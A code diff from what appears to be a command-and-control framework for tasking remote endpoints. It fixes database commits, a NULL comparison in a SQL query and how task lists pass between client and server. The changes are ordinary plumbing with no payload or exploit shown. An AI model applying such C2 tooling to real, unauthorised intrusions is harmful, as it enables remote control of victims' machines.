@@ -148,7 +148,7 @@ class C2Client:
         request["action"] = "get_tasks"
         request["endpoint_id"] = self.endpoint_id
         new_tasks = self.c2_server_transaction(server_message=request)
-        self.tasking_queue.extend([[row.split()[0],row.split()[1]] for row in new_tasks])
+        self.tasking_queue = new_tasks
 
     
     def update_tasking(self):
@@ -206,6 +206,7 @@ class C2Database:
         query = '''INSERT INTO tasking(uuid,endpoint,task,created) 
                     Values(?,?,?,?) '''
         self.db_cursor.execute(query,(new_task_id, str(endpoint), json.dumps(tasking), created_date))
+        self.conn.commit()
         return new_task_id
 
     def add_results(self, task_id: str, task_results: str):
@@ -214,6 +215,7 @@ class C2Database:
                     SET results = ? 
                     WHERE uuid = ?'''
         self.db_cursor.execute(query, (task_results, task_id))
+        self.conn.commit()
 
     def query_tasking(self, endpoint: uuid, filter: dict = {}) -> list:
         # pull tasking results from db with option to filter
@@ -222,8 +224,8 @@ class C2Database:
             query = '''SELECT * FROM tasking WHERE uuid = ?'''
             data = (filter["id"])
         elif filter.get("new_tasks", False):
-            query = '''SELECT uuid, task FROM tasking WHERE endpoint = ? and results = NULL'''
-            data = (str(endpoint))
+            query = '''SELECT uuid, task FROM tasking WHERE endpoint = ? and results IS NULL'''
+            data = (str(endpoint),)
             logger.debug(str(endpoint))
         else:
             query = '''SELECT * FROM tasking WHERE endpoint = ?'''
@@ -247,6 +249,7 @@ class C2Database:
         query = '''INSERT INTO endpoints(uuid,hostname,first_callback,last_callback,last_ip) Values(?,?,?,?,?)'''
         data = (new_uuid, hostname, first_callback, last_callback, last_ip)
         self.db_cursor.execute(query, data)
+        self.conn.commit()
         return new_uuid
 
     def remove_endpoint(self, endpoint: uuid):
@@ -522,13 +525,12 @@ class C2Server:
             src_ip = message["info"]["ip"]
             hostname = message["info"]["hostname"]
             response["action"] = "register_endpoint_response"
-            response["response"]
             response["response"]["endpoint_id"] =  self.db_conn.register_endpoint(hostname=hostname, last_ip=src_ip)
             logger.debug(f"registered endpoint IP: {src_ip}")
         elif message_type == "client" and action == "get_tasks":
             response["action"] = "get_tasks_response"
             new_tasks = self.db_conn.query_tasking(endpoint=endpoint_id, filter={"new_tasks": True})
-            response["response"] = new_tasks.splitlines()
+            response["response"] = new_tasks
         elif message_type == "client" and action == "put_results":
             response["action"] = "put_results_response"
             for task in message["tasking"]:
